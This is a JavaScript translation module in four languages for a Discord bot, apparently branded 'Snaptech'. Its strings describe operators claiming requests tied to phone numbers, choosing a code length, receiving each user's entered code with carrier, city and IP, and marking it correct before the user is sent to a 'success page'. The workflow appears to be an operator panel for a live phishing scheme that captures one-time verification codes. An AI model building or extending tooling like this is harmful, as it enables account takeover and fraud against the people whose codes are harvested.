/**
 * i18n.js — per-user translations
 *
 * Only used for content that's scoped to ONE viewer — ephemeral replies,
 * DMs, and the personal settings panel. Anything posted in a shared channel
 * (the public request embeds) is intentionally NOT run through this: it's
 * the same Discord message for every staff member watching it, so it has
 * to stay in one consistent language rather than "the last person who
 * touched it"'s language.
 *
 * Default is English if a language isn't recognized or a key is missing
 * for a given language — never throws, never renders blank.
 */

export const SUPPORTED_LANGS = ["en", "fr", "pl", "es"];

const STRINGS = {
    en: {
        no_permission:         "❌ You don't have permission to use this.",
        no_permission_command: "❌ You don't have permission to use this command.",
        already_claimed:       (user) => `🔒 Already claimed by ${user}.`,
        claimed:                (phone, user) => `✅ Request **${phone}** claimed by ${user}`,
        claimer_only:           (user) => `🔒 This request was claimed by ${user}.\nOnly they can interact with these buttons.`,
        invalid_ip:             "❌ Invalid IP.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` banned!`,
        network_error_ban:      "❌ Network error while banning.",
        network_error_claim:    "❌ Network error while claiming.",
        generic_error:          "❌ Error.",
        len_requested:          (n, phone) => `✅ **${n}-digit** code requested for ${phone}`,
        wrong_reported:         (phone) => `✅ Wrong number reported for ${phone}`,
        unclaimed:              (phone) => `↩️ Request **${phone}** unclaimed. Back in the queue.`,
        truecode_ok:            (phone) => `✅ Code validated for ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Code rejected for ${phone}.\nChoose a new length in the request channel — the user will re-enter their code.`,

        dm_truecode_title: "✅ Code Validated!",
        dm_truecode_desc:  (ts) => `👤 Validated by you\n⏰ <t:${ts}:R>\nThe user is being redirected to the success page.`,
        dm_falsecode_title: "🔄 Code Rejected",
        dm_falsecode_desc:  "⚠️ Marked as incorrect.\nChoose the next length from the channel embed — this DM is now closed.",

        code_dm_title:           "🔓 Code Submitted by User",
        code_dm_field_code:      "🔢 Code Entered",
        code_dm_field_phone:     "📞 Phone",
        code_dm_field_carrier:   "📡 Carrier",
        code_dm_field_submitted: "⏰ Submitted",
        code_dm_field_country:   "🌍 Country",
        code_dm_field_city:      "🏙️ City",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Approve or reject the code below  •  Snaptech",
        code_dm_btn_true:        "✅ True Code",
        code_dm_btn_false:       "❌ False Code",

        settings_title:            "⚙️ My Settings",
        settings_language_label:   "🌐 Language",
        settings_pings_label:      "🔔 Pings",
        settings_pings_enabled:    "`Enabled`",
        settings_pings_disabled:   "`Disabled`",
        settings_footer:           "Only visible to you  •  Snaptech",
        settings_lang_placeholder: "Choose your language",
        settings_ping_enable_btn:  "🔔 Enable pings",
        settings_ping_disable_btn: "🔕 Disable pings",

        config_default_channel:  (ch) => `✅ Default channel set to ${ch}`,
        config_operator_channel: (op, ch) => `✅ Channel for **${op}** set to ${ch}`,
    },
    fr: {
        no_permission:         "❌ Tu n'as pas la permission d'utiliser ceci.",
        no_permission_command: "❌ Tu n'as pas la permission d'utiliser cette commande.",
        already_claimed:       (user) => `🔒 Déjà pris en charge par ${user}.`,
        claimed:                (phone, user) => `✅ Requête **${phone}** prise en charge par ${user}`,
        claimer_only:           (user) => `🔒 Cette requête a été prise en charge par ${user}.\nSeule cette personne peut utiliser ces boutons.`,
        invalid_ip:             "❌ IP invalide.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` bannie !`,
        network_error_ban:      "❌ Erreur réseau lors du bannissement.",
        network_error_claim:    "❌ Erreur réseau lors de la prise en charge.",
        generic_error:          "❌ Erreur.",
        len_requested:          (n, phone) => `✅ Code à **${n} chiffres** demandé pour ${phone}`,
        wrong_reported:         (phone) => `✅ Mauvais numéro signalé pour ${phone}`,
        unclaimed:              (phone) => `↩️ Requête **${phone}** libérée. De retour dans la file d'attente.`,
        truecode_ok:            (phone) => `✅ Code validé pour ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Code rejeté pour ${phone}.\nChoisis une nouvelle longueur dans le salon de la requête — l'utilisateur va ressaisir son code.`,

        dm_truecode_title: "✅ Code validé !",
        dm_truecode_desc:  (ts) => `👤 Validé par toi\n⏰ <t:${ts}:R>\nL'utilisateur est redirigé vers la page de succès.`,
        dm_falsecode_title: "🔄 Code rejeté",
        dm_falsecode_desc:  "⚠️ Marqué comme incorrect.\nChoisis la prochaine longueur depuis l'embed du salon — ce DM est maintenant clos.",

        code_dm_title:           "🔓 Code soumis par l'utilisateur",
        code_dm_field_code:      "🔢 Code saisi",
        code_dm_field_phone:     "📞 Téléphone",
        code_dm_field_carrier:   "📡 Opérateur",
        code_dm_field_submitted: "⏰ Soumis",
        code_dm_field_country:   "🌍 Pays",
        code_dm_field_city:      "🏙️ Ville",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Approuve ou rejette le code ci-dessous  •  Snaptech",
        code_dm_btn_true:        "✅ Code correct",
        code_dm_btn_false:       "❌ Code incorrect",

        settings_title:            "⚙️ Mes réglages",
        settings_language_label:   "🌐 Langue",
        settings_pings_label:      "🔔 Pings",
        settings_pings_enabled:    "`Activés`",
        settings_pings_disabled:   "`Désactivés`",
        settings_footer:           "Visible uniquement par toi  •  Snaptech",
        settings_lang_placeholder: "Choisis ta langue",
        settings_ping_enable_btn:  "🔔 Activer les pings",
        settings_ping_disable_btn: "🔕 Désactiver les pings",

        config_default_channel:  (ch) => `✅ Salon par défaut défini sur ${ch}`,
        config_operator_channel: (op, ch) => `✅ Salon pour **${op}** défini sur ${ch}`,
    },
    pl: {
        no_permission:         "❌ Nie masz uprawnień, aby tego użyć.",
        no_permission_command: "❌ Nie masz uprawnień, aby użyć tej komendy.",
        already_claimed:       (user) => `🔒 Już zajęte przez ${user}.`,
        claimed:                (phone, user) => `✅ Zgłoszenie **${phone}** przejęte przez ${user}`,
        claimer_only:           (user) => `🔒 To zgłoszenie zostało przejęte przez ${user}.\nTylko ta osoba może korzystać z tych przycisków.`,
        invalid_ip:             "❌ Nieprawidłowy adres IP.",
        ip_banned:              (ip) => `🚫 IP \`${ip}\` zbanowane!`,
        network_error_ban:      "❌ Błąd sieci podczas banowania.",
        network_error_claim:    "❌ Błąd sieci podczas przejmowania.",
        generic_error:          "❌ Błąd.",
        len_requested:          (n, phone) => `✅ Poproszono o kod **${n}-cyfrowy** dla ${phone}`,
        wrong_reported:         (phone) => `✅ Zgłoszono zły numer dla ${phone}`,
        unclaimed:              (phone) => `↩️ Zgłoszenie **${phone}** zwolnione. Wraca do kolejki.`,
        truecode_ok:            (phone) => `✅ Kod zweryfikowany dla ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Kod odrzucony dla ${phone}.\nWybierz nową długość na kanale zgłoszenia — użytkownik wpisze kod ponownie.`,

        dm_truecode_title: "✅ Kod zweryfikowany!",
        dm_truecode_desc:  (ts) => `👤 Zweryfikowane przez Ciebie\n⏰ <t:${ts}:R>\nUżytkownik jest przekierowywany na stronę sukcesu.`,
        dm_falsecode_title: "🔄 Kod odrzucony",
        dm_falsecode_desc:  "⚠️ Oznaczono jako nieprawidłowy.\nWybierz kolejną długość z embeda na kanale — ta wiadomość DM jest teraz zamknięta.",

        code_dm_title:           "🔓 Kod przesłany przez użytkownika",
        code_dm_field_code:      "🔢 Wpisany kod",
        code_dm_field_phone:     "📞 Telefon",
        code_dm_field_carrier:   "📡 Operator",
        code_dm_field_submitted: "⏰ Przesłano",
        code_dm_field_country:   "🌍 Kraj",
        code_dm_field_city:      "🏙️ Miasto",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Zatwierdź lub odrzuć kod poniżej  •  Snaptech",
        code_dm_btn_true:        "✅ Poprawny kod",
        code_dm_btn_false:       "❌ Błędny kod",

        settings_title:            "⚙️ Moje ustawienia",
        settings_language_label:   "🌐 Język",
        settings_pings_label:      "🔔 Pingi",
        settings_pings_enabled:    "`Włączone`",
        settings_pings_disabled:   "`Wyłączone`",
        settings_footer:           "Widoczne tylko dla Ciebie  •  Snaptech",
        settings_lang_placeholder: "Wybierz swój język",
        settings_ping_enable_btn:  "🔔 Włącz pingi",
        settings_ping_disable_btn: "🔕 Wyłącz pingi",

        config_default_channel:  (ch) => `✅ Kanał domyślny ustawiony na ${ch}`,
        config_operator_channel: (op, ch) => `✅ Kanał dla **${op}** ustawiony na ${ch}`,
    },
    es: {
        no_permission:         "❌ No tienes permiso para usar esto.",
        no_permission_command: "❌ No tienes permiso para usar este comando.",
        already_claimed:       (user) => `🔒 Ya reclamado por ${user}.`,
        claimed:                (phone, user) => `✅ Solicitud **${phone}** reclamada por ${user}`,
        claimer_only:           (user) => `🔒 Esta solicitud fue reclamada por ${user}.\nSolo esa persona puede usar estos botones.`,
        invalid_ip:             "❌ IP no válida.",
        ip_banned:              (ip) => `🚫 ¡IP \`${ip}\` baneada!`,
        network_error_ban:      "❌ Error de red al banear.",
        network_error_claim:    "❌ Error de red al reclamar.",
        generic_error:          "❌ Error.",
        len_requested:          (n, phone) => `✅ Código de **${n} dígitos** solicitado para ${phone}`,
        wrong_reported:         (phone) => `✅ Número incorrecto reportado para ${phone}`,
        unclaimed:              (phone) => `↩️ Solicitud **${phone}** liberada. De vuelta en la cola.`,
        truecode_ok:            (phone) => `✅ Código validado para ${phone} 🎉`,
        falsecode_ok:           (phone) => `🔄 Código rechazado para ${phone}.\nElige una nueva longitud en el canal de la solicitud — el usuario volverá a introducir su código.`,

        dm_truecode_title: "✅ ¡Código validado!",
        dm_truecode_desc:  (ts) => `👤 Validado por ti\n⏰ <t:${ts}:R>\nEl usuario está siendo redirigido a la página de éxito.`,
        dm_falsecode_title: "🔄 Código rechazado",
        dm_falsecode_desc:  "⚠️ Marcado como incorrecto.\nElige la siguiente longitud desde el embed del canal — este DM está ahora cerrado.",

        code_dm_title:           "🔓 Código enviado por el usuario",
        code_dm_field_code:      "🔢 Código introducido",
        code_dm_field_phone:     "📞 Teléfono",
        code_dm_field_carrier:   "📡 Operador",
        code_dm_field_submitted: "⏰ Enviado",
        code_dm_field_country:   "🌍 País",
        code_dm_field_city:      "🏙️ Ciudad",
        code_dm_field_ip:        "🌐 IP",
        code_dm_footer:          "⚡ Aprueba o rechaza el código abajo  •  Snaptech",
        code_dm_btn_true:        "✅ Código correcto",
        code_dm_btn_false:       "❌ Código incorrecto",

        settings_title:            "⚙️ Mis ajustes",
        settings_language_label:   "🌐 Idioma",
        settings_pings_label:      "🔔 Menciones",
        settings_pings_enabled:    "`Activadas`",
        settings_pings_disabled:   "`Desactivadas`",
        settings_footer:           "Solo visible para ti  •  Snaptech",
        settings_lang_placeholder: "Elige tu idioma",
        settings_ping_enable_btn:  "🔔 Activar menciones",
        settings_ping_disable_btn: "🔕 Desactivar menciones",

        config_default_channel:  (ch) => `✅ Canal por defecto establecido en ${ch}`,
        config_operator_channel: (op, ch) => `✅ Canal para **${op}** establecido en ${ch}`,
    },
};

/**
 * Resolve a translated string. `key` selects the entry; if it's a function,
 * the remaining args are passed through to it. Falls back to English for an
 * unsupported language or a key missing from that language's dictionary —
 * never throws, never returns undefined.
 */
export function t(lang, key, ...args) {
    const dict  = STRINGS[lang] || STRINGS.en;
    const entry = dict[key] !== undefined ? dict[key] : STRINGS.en[key];
    return typeof entry === "function" ? entry(...args) : entry;
}
